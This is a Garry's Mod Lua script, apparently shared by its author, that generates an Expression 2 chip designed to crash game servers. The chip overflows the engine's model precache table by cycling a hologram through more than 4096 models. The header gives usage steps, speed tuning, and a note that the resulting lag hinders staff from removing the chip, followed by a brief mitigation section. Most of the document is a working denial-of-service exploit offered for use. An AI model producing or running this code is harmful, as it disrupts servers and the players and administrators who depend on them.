--[[
    wi_hmcc.lua


    W Iremod

    H olo
    M odel
    C ache
    C rash

    coded by lokachop @@ 30/03/2022
    contact @@ Lokachop#5862 (or this id: 294917023450923008)


    (works in ANY server with e2 and holomodel any!)
    it's also engine level too!


    UPON RUN:
        will generate an e2 file in your expression2 folder called "LWHMCC", which will run the exploit upon being placed down

    UPON RUNNING THE E2 FILE:
        the server will start lagging massively, as it has to load > 4096 models in from hdd, this can not lag alot on some servers if they use SSDs but on HDDs the perf impact is huge
        after running for a while, the server will crash as the engine precache table will be full and the engine will not be able to load any more models

        this also has the side effect of lagging clients intensively based on whether they have their gmod in an SSD / HDD too as the clients need to load in the models too
        this makes it hard for staff members to get rid of the E2 in time

    SPEED:
        it took ~ 5 mins for this to crash on my local server with ItrSpeed set to 1, it might be possible to get a sub 1m crash time with the right ItrSpeed but I haven't tested it yet
        it also depends on how many precached models the server has before you even run it, if there's a bunch of precached models already it will take less time to crash

    HOW DOES THIS WORK:
        this exploit works by overflowing the model precache table via making a hologram and changing its model to 4096 different models, which overflows the precache table
        the massive lag is caused by source having to load each model from hard drive into gmod in order to render it, which is very slow

    HOW TO FIX:
        wire_holograms_modelany 0 or removing util.IsValidModel() and util.PrecacheModel() from all the holo code
        it also might be possible to set a per-user limit for holoModel() but its possible that could break some people's code unless its set to something high
        and even then you can get 2-4 players to all spawn different models
]]--


local Models = {}
local MaxModels = 4096 * 2

local ItrSpeed = 8 -- higher = faster and laggier but more crash prone on local client, 8 works well!
local WaitBeforeRun = 8 -- time in seconds to wait before running the exploit

local CodeBuffer = [[@name LWHMCC
@persist Itr Run CachedModels:table
runOnTick(1)

# THIS IS A CRASH EXPLOIT!
# Coded by lokachop @@ 30 / 03 / 2022
# DO NOT DISTRIBUTE!

if(first() | dupefinished())
{
    # make each model 1 new line to not lag in e2 editor
    CachedModels = table(]]


local function LoadRecursive(path, gamedir) -- generic recursive loader function
    print("recursive load \"" .. path .. "\"...")

    local files, dirs = file.Find(path .. "/*", gamedir)

    for k, v in pairs(files) do
        if string.match(v, "[%g]+%.mdl") and #Models < MaxModels then
            Models[#Models + 1] = path .. "/" .. v
        end
    end

    for k, v in pairs(dirs) do
        LoadRecursive(path .. "/" .. v, gamedir)
    end
end

-- load a bunch of models to make sure we reach > 4096 models in total
LoadRecursive("models", "hl2") -- load non gmod models to make sure it works on most servers
LoadRecursive("models", "cstrike") -- every server has csstrike too!
LoadRecursive("models", "ep2") -- ep2 is also needed to get > 4096 models (needed to overflow at worst case)




-- add all the models to the code buffer
for k, v in pairs(Models) do
    CodeBuffer = CodeBuffer .. "\n    \"" .. v .. "\","
end


CodeBuffer = string.sub(CodeBuffer, 1, #CodeBuffer - 1) -- remove the last comma

-- finish the code buffer
CodeBuffer = CodeBuffer .. [[)
    holoCreate(1)
    holoParent(1, entity())
    holoPos(1, vec(16324, 0, 0))
    holoAng(1, entity():toWorld(ang(0, 0, 0)))
    holoScale(1, vec(0.001, 0.001, 0.001))

    timer("RUN", ]] .. WaitBeforeRun * 1000 .. [[)
}

if(clk("RUN"))
{
    Run = 1
}

if(Run)
{
    for(I = 1, ]] .. ItrSpeed .. [[)
    {
        Itr = Itr + 1
        holoModel(1, CachedModels[Itr, string])
    }
}
]]


print(CodeBuffer)

-- write the code buffer to an e2 file
file.Write("expression2/LWHMCC.txt", CodeBuffer)